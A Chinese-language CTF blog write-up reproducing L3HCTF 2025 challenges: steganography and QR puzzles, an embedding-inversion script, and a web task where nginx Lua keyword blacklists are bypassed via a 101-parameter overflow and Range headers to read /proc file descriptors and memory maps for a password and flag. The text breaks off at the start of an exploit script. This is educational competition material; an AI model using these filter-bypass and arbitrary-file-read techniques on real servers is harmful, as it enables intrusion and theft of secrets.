@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="L3HCTF 2025部分复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="L3HCTF 2025部分复现">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/60548.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="L3HCTF 2025部分复现">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6876034f58cb8da5c8b1a1bd.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6878b4e358cb8da5c8be6ebc.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6878b63758cb8da5c8be7860.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6878b9a858cb8da5c8be8400.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6878c1ce58cb8da5c8beb630.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6878c86458cb8da5c8bebce1.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6878ca1a58cb8da5c8bebd82.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6878cb1358cb8da5c8bebe41.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6878ceed58cb8da5c8bec20d.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6879ee4d58cb8da5c8c2408e.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6879f12358cb8da5c8c25bb2.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6879f39258cb8da5c8c271ef.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6879f54a58cb8da5c8c27f32.png">
+<meta property="article:published_time" content="2025-07-15T07:16:55.000Z">
+<meta property="article:modified_time" content="2025-08-06T02:26:14.226Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/6876034f58cb8da5c8b1a1bd.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/60548.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>L3HCTF 2025部分复现 | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">13</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">77</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/60548.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          L3HCTF 2025部分复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-07-15 15:16:55" itemprop="dateCreated datePublished" datetime="2025-07-15T15:16:55+08:00">2025-07-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-08-06 10:26:14" itemprop="dateModified" datetime="2025-08-06T10:26:14+08:00">2025-08-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+      
+      
+        <p>L3HCTF 2025部分复现</p>
+<span id="more"></span>
+<p>复现主要参考SU战队的wp <a target="_blank" rel="noopener" href="https://su-team.cn/posts/e3fd1be7.html">https://su-team.cn/posts/e3fd1be7.html</a></p>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="量子双生影"><a href="#量子双生影" class="headerlink" title="量子双生影"></a>量子双生影</h2><p>下载题目的附件得到了一个ai风格的二维码，但是之前不知道用什么工具<br><a target="_blank" rel="noopener" href="https://github.com/Tokeii0/LoveLy-QRCode-Scanner">LoveLy-QRCode-Scanner</a><br><img src="https://pic1.imgdb.cn/item/6876034f58cb8da5c8b1a1bd.png"><br>把附件给的图片用这个工具分析，得到flag is not here, but I can give you the key: “quantum”<br>然后很自然可以想到有数据隐写  ntfs数据流隐写<br>下载ntfsstreamseditor软件，得到备份数据。 <a target="_blank" rel="noopener" href="https://www.duote.com/soft/10774.html#app-intro">https://www.duote.com/soft/10774.html#app-intro</a><br><img src="https://pic1.imgdb.cn/item/6878b4e358cb8da5c8be6ebc.png"><br>在图片的属性中，可以看到两张图片的尺寸是一样的，所以将两个图片进行异或<br><img src="https://pic1.imgdb.cn/item/6878b63758cb8da5c8be7860.png"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">img1_path, img2_path, output_path=<span class="string">&quot;xor_result.png&quot;</span></span>):</span><br><span class="line">    <span class="comment"># 加载并转换为RGB格式</span></span><br><span class="line">    img1 = Image.<span class="built_in">open</span>(img1_path).convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">    img2 = Image.<span class="built_in">open</span>(img2_path).convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> img1.size != img2.size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;图片尺寸不一致，无法进行异或运算&quot;</span>)</span><br><span class="line"></span><br><span class="line">    w, h = img1.size</span><br><span class="line">    result = Image.new(<span class="string">&quot;RGB&quot;</span>, (w, h))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每像素逐位异或</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">            r1, g1, b1 = img1.getpixel((x, y))</span><br><span class="line">            r2, g2, b2 = img2.getpixel((x, y))</span><br><span class="line">            result.putpixel((x, y), (</span><br><span class="line">                r1 ^ r2,</span><br><span class="line">                g1 ^ g2,</span><br><span class="line">                b1 ^ b2</span><br><span class="line">            ))</span><br><span class="line"></span><br><span class="line">    result.save(output_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 已保存异或图像为: <span class="subst">&#123;output_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例用法</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    xor_images(<span class="string">&#x27;/Volumes/[C] Windows 11/Downloads/C!_Downloads_stream2.webp!stream1.webp&#x27;</span>, <span class="string">&#x27;/Volumes/[C] Windows 11/Downloads/stream2.webp&#x27;</span>, <span class="string">&#x27;/Users/kakeru/Downloads/a.png&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+<p>再用上面那个二维码工具提取到flag<br><img src="https://pic1.imgdb.cn/item/6878b9a858cb8da5c8be8400.png"></p>
+<h2 id="Please-Sign-In"><a href="#Please-Sign-In" class="headerlink" title="Please Sign In"></a>Please Sign In</h2><p>直接把题目喂给ai生成脚本，然后把生成的图片发送到服务器，就能得到flag</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torchvision.models <span class="keyword">import</span> shufflenet_v2_x1_0, ShuffleNet_V2_X1_0_Weights</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Step 1: Setting up the model and target embedding...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- This part must EXACTLY match the server&#x27;s setup ---</span></span><br><span class="line"><span class="comment"># 1.1 Load the same pre-trained model</span></span><br><span class="line">model = shufflenet_v2_x1_0(weights=ShuffleNet_V2_X1_0_Weights.IMAGENET1K_V1)</span><br><span class="line">model.fc = torch.nn.Identity() <span class="comment"># Turn it into a feature extractor</span></span><br><span class="line">model.<span class="built_in">eval</span>() <span class="comment"># Set it to evaluation mode</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.2 The target embedding vector from the problem description</span></span><br><span class="line">target_embedding_list = [<span class="number">0.01141324918717146</span>, <span class="number">0.05113353952765465</span>, ... , <span class="number">0.03890109062194824</span>] <span class="comment"># Paste the full list here</span></span><br><span class="line">target_embedding = torch.tensor(target_embedding_list, dtype=torch.float32).unsqueeze(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Model loaded. Target embedding shape: <span class="subst">&#123;target_embedding.shape&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Optimization Setup ---</span></span><br><span class="line"><span class="comment"># 2.1 Start with a random image (a tensor of random values)</span></span><br><span class="line"><span class="comment"># The model expects a 3-channel (RGB) image. Size doesn&#x27;t matter too much, 224x224 is standard.</span></span><br><span class="line">generated_image = torch.randn(<span class="number">1</span>, <span class="number">3</span>, <span class="number">224</span>, <span class="number">224</span>, requires_grad=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.2 Set up the optimizer. Adam is a good choice.</span></span><br><span class="line"><span class="comment"># It will update the pixels of `generated_image`.</span></span><br><span class="line">optimizer = torch.optim.Adam([generated_image], lr=<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.3 Define the loss function (Mean Squared Error)</span></span><br><span class="line">loss_fn = torch.nn.MSELoss()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nStep 2: Starting the optimization process to generate the image...&quot;</span>)</span><br><span class="line"><span class="comment"># --- The Main Loop ---</span></span><br><span class="line">num_steps = <span class="number">1000</span> <span class="comment"># More steps can lead to better results</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_steps):</span><br><span class="line">    <span class="comment"># 3.1 Get the embedding of our current generated image</span></span><br><span class="line">    current_embedding = model(generated_image)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3.2 Calculate the loss</span></span><br><span class="line">    loss = loss_fn(current_embedding, target_embedding)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3.3 Backpropagation</span></span><br><span class="line">    optimizer.zero_grad() <span class="comment"># Clear previous gradients</span></span><br><span class="line">    loss.backward()      <span class="comment"># Calculate new gradients</span></span><br><span class="line">    optimizer.step()     <span class="comment"># Update the image pixels</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3.4 Clamp the image values to be in a valid range [0, 1]</span></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        generated_image.clamp_(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i + <span class="number">1</span>) % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Step <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>/<span class="subst">&#123;num_steps&#125;</span>, Loss: <span class="subst">&#123;loss.item():<span class="number">.10</span>f&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nOptimization finished!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Final Loss: <span class="subst">&#123;loss.item():<span class="number">.10</span>f&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Save the Result ---</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nStep 3: Saving the generated image to &#x27;generated_image.png&#x27;...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert the final tensor to a PIL image and save it</span></span><br><span class="line">final_image_tensor = generated_image.squeeze(<span class="number">0</span>)</span><br><span class="line">to_pil = transforms.ToPILImage()</span><br><span class="line">final_image = to_pil(final_image_tensor)</span><br><span class="line">final_image.save(<span class="string">&quot;generated_image.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;✅ Done! Submit &#x27;generated_image.png&#x27; to the server.&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+<p><img src="https://pic1.imgdb.cn/item/6878c1ce58cb8da5c8beb630.png"></p>
+<h2 id="PaperBack"><a href="#PaperBack" class="headerlink" title="PaperBack"></a>PaperBack</h2><p>这题很有意思，跟着wp复现的<br>题目描述：Someone thought paper could replace a CD. Turns out… they weren’t entirely wrong. Can you read between the dots? Btw, I really like OllyDbg.<br>搜索PaperBack，知道这是一种存储数据的方式<br><img src="https://pic1.imgdb.cn/item/6878c86458cb8da5c8bebce1.png"><br>下载这个文件，扫描不冒泡得到一个ws文件，放到cyberchef中，转成hex<br><img src="https://pic1.imgdb.cn/item/6878ca1a58cb8da5c8bebd82.png"><br>这里一共就20 09 0d 0a 这几种字符  0d0a又是对应着\r\n  把它们换成换行<br><img src="https://pic1.imgdb.cn/item/6878cb1358cb8da5c8bebe41.png"><br>接下来是最妙的一步，把单行出现的09忽略，然后把20对应0，19对应1<br>还有wp中没说的，把每行的最后8位提取出来，因为这样才是有意义的字符<br><img src="https://pic1.imgdb.cn/item/6878ceed58cb8da5c8bec20d.png"></p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="gateway-advance"><a href="#gateway-advance" class="headerlink" title="gateway_advance"></a>gateway_advance</h2><p>下载题目附件 得到nginx.conf文件 配置文件中给了一些借口<br>static映射到&#x2F;www目录。 download可以将请求代理到localhost&#x2F;static  read_anywhere可以读取任意文件，但是需要password<br>并且flag和password在一开始都删除了，需要在内存中找 &#x2F;proc&#x2F;{pid}&#x2F;fd&#x2F;{fd} 来访问它的内容<br>先来看download路由，有一些过滤</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">location /download &#123;</span><br><span class="line">            access_by_lua_block &#123;</span><br><span class="line">                local blacklist = &#123;&quot;%.&quot;, &quot;/&quot;, &quot;;&quot;, &quot;flag&quot;, &quot;proc&quot;&#125;</span><br><span class="line">                local args = ngx.req.get_uri_args()</span><br><span class="line">                for k, v in pairs(args) do</span><br><span class="line">                    for _, b in ipairs(blacklist) do</span><br><span class="line">                        if string.find(v, b) then</span><br><span class="line">                            ngx.exit(403)</span><br><span class="line">                        end</span><br><span class="line">                    end</span><br><span class="line">                end</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>
+<p>搜索知道ngx.req.get_uri_args存在参数溢出漏洞<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/103771">https://www.anquanke.com/post/id/103771</a><br>安全检测只在前100个参数中，第101个参数不会检测，所以构造101个参数<br><img src="https://pic1.imgdb.cn/item/6879ee4d58cb8da5c8c2408e.png"><br>现在可以成功读取文件了。<br>但是还有一个输出过滤</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LUA"><figure class="iseeu highlight /lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">body_filter_by_lua_block &#123;</span><br><span class="line">                <span class="keyword">local</span> blacklist = &#123;<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;l3hsec&quot;</span>, <span class="string">&quot;l3hctf&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="string">&quot;secret&quot;</span>, <span class="string">&quot;confidential&quot;</span>&#125;</span><br><span class="line">                <span class="keyword">for</span> _, b <span class="keyword">in</span> <span class="built_in">ipairs</span>(blacklist) <span class="keyword">do</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">string</span>.<span class="built_in">find</span>(ngx.<span class="built_in">arg</span>[<span class="number">1</span>], b) <span class="keyword">then</span></span><br><span class="line">                        ngx.<span class="built_in">arg</span>[<span class="number">1</span>] = <span class="built_in">string</span>.<span class="built_in">rep</span>(<span class="string">&quot;*&quot;</span>, <span class="built_in">string</span>.<span class="built_in">len</span>(ngx.<span class="built_in">arg</span>[<span class="number">1</span>]))</span><br><span class="line">                    <span class="keyword">end</span></span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>
+<p>对于这个限制可以用Range 头来绕过，Range头允许客户端指定需要获取的资源字节范围，实现断点续传和分块下载功能。<br>密码在内存中，并且有进程在打开它，所以在&#x2F;proc&#x2F;self&#x2F;fd&#x2F;{fd}中找 最后是在6中<br>然后用range头截取最后得到password<code>passwordismemeispasswordsoneverwannagiveyouup</code><br><img src="https://pic1.imgdb.cn/item/6879f12358cb8da5c8c25bb2.png"><br>获得密码之后就可以在read_anywhere路由读取任意文件了，先去&#x2F;proc&#x2F;self&#x2F;maps读取内存映射</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">location /read_anywhere &#123;</span><br><span class="line">            access_by_lua_block &#123;</span><br><span class="line">                <span class="keyword">if</span> ngx.var.http_x_gateway_password ~= password then</span><br><span class="line">                    ngx.say(<span class="string">&quot;go find the password first!&quot;</span>)</span><br><span class="line">                    ngx.<span class="keyword">exit</span>(<span class="number">403</span>)</span><br><span class="line">                end</span><br><span class="line">            &#125;</span><br><span class="line">            content_by_lua_block &#123;</span><br><span class="line">                local f = io.open(ngx.var.http_x_gateway_filename, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> not f then</span><br><span class="line">                    ngx.<span class="keyword">exit</span>(<span class="number">404</span>)</span><br><span class="line">                end</span><br></pre></td></tr></table></figure></div>
+<p>password放在X-Gateway-Password中 想要读取的文件放在X-Gateway-Filename请求头中<br><img src="https://pic1.imgdb.cn/item/6879f39258cb8da5c8c271ef.png"><br>得到内存映射之后,有两种方式得到flag，一种是把内存映射给ai生成脚本，扫描得到flag</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span 